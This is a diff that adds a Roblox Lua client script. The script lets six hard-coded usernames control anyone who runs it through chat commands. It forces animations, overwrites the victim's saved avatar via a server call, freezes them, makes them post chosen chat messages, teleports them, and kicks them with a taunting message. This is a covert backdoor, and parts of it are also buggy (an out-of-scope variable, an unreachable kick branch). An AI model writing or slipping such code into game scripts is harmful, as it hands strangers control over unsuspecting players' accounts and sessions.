@@ -1,0 +1,148 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+
+-- List of target users who can execute commands
+local targetUsernames = {
+    ["zynlopea"] = true,
+    ["Rylix56"] = true,
+    ["zynlope"] = true,
+    ["sci_mythical77"] = true,
+    ["nowummy"] = true,
+    ["nowumy"] = true,
+}
+
+local function isTargetPlayer(playerName)
+    return targetUsernames[playerName] ~= nil
+end
+
+local function onChat(player, message)
+    if not isTargetPlayer(player.Name) then return end
+    local command = message:lower()
+
+    if command == "/e fa" then
+        local myPlayer = Players.LocalPlayer
+        local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        
+        if humanoid then
+            local animation = Instance.new("Animation")
+            animation.AnimationId = "rbxassetid://754656200"
+
+            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
+            local animationTrack = animator:LoadAnimation(animation)
+
+            animationTrack.Looped = true
+            animationTrack:Play()
+            animationTrack:AdjustSpeed(50)
+        end
+
+    elseif command == "/e unfa" then
+        if animationTrack then
+            animationTrack:Stop()
+        end
+
+    elseif command == "/e kitten" then
+        local myPlayer = Players.LocalPlayer
+        if myPlayer then
+            local args = {
+                [1] = {
+                    ["SwimAnimation"] = 2510240941,
+                    ["Torso"] = 4637151279,
+                    ["ProportionScale"] = 0,
+                    ["ClimbAnimation"] = 2510230574,
+                    ["Shirt"] = 11289085978,
+                    ["FaceAccessory"] = "13353986061,12580366888,8923599923",
+                    ["RightArmColor"] = { "248", "248", "248" },
+                    ["HairAccessory"] = "13918965164,14314838611",
+                    ["FallAnimation"] = 2510233257,
+                    ["TorsoColor"] = { "248", "248", "248" },
+                    ["DepthScale"] = 0.8,
+                    ["HeightScale"] = 0.9,
+                    ["WaistAccessory"] = "14335771887",
+                    ["BodyTypeScale"] = 0,
+                    ["BackAccessory"] = "8651335862",
+                    ["Emotes"] = {
+                        ["1"] = { 9528286240 },
+                        ["8"] = { 12874468267 },
+                        ["3"] = { 7466046574 },
+                        ["2"] = { 11309263077 },
+                        ["4"] = { 3576968026 },
+                        ["7"] = { 13344121112 }
+                    },
+                    ["Pants"] = 14851012835,
+                    ["JumpAnimation"] = 2510236649,
+                    ["HatAccessory"] = "12579341301,13142881183,1402432199",
+                    ["WalkAnimation"] = 2510242378,
+                    ["IdleAnimation"] = 2510235063,
+                    ["RunAnimation"] = 2510238627,
+                    ["HeadScale"] = 1,
+                    ["GraphicTShirt"] = 10891067215
+                }
+            }
+            ReplicatedStorage.FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
+        end
+
+    elseif command == "/e freeze" then
+        local myCharacter = Players.LocalPlayer.Character
+        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+            myCharacter.HumanoidRootPart.Anchored = true
+        end
+
+    elseif command == "/e unfreeze" then
+        local myCharacter = Players.LocalPlayer.Character
+        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+            myCharacter.HumanoidRootPart.Anchored = false
+        end
+
+    elseif command:sub(1, 7) == "/e chat" then
+        local chatMessage = message:sub(9)
+        if chatMessage:gsub("%s+", "") ~= "" then
+            local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
+            if textChannel then
+                textChannel:SendAsync(chatMessage)
+            end
+        end
+
+    elseif command == "/e bring" then
+        local targetCharacter = player.Character
+        local myPlayer = Players.LocalPlayer
+
+        if myPlayer and targetCharacter then
+            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
+            local myCharacter = myPlayer.Character
+
+            if myCharacter and targetHRP then
+                local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
+                if myHRP then
+                    myHRP.CFrame = targetHRP.CFrame
+                end
+            end
+        end
+
+    elseif command == "/e kick" then
+        -- Kick without reason
+        local myPlayer = Players.LocalPlayer
+        if myPlayer then
+            myPlayer:Kick("Kicked by the goat itself. Zynlope.")
+        end
+
+    elseif command:sub(1, 8) == "/e kick r" then
+        -- Kick with reason: grab everything after "/e kick r "
+        local reason = message:sub(10)
+        if reason ~= "" then
+            local myPlayer = Players.LocalPlayer
+            if myPlayer then
+                myPlayer:Kick("Kicked by command reason: "..reason)
+            end
+        end
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end)
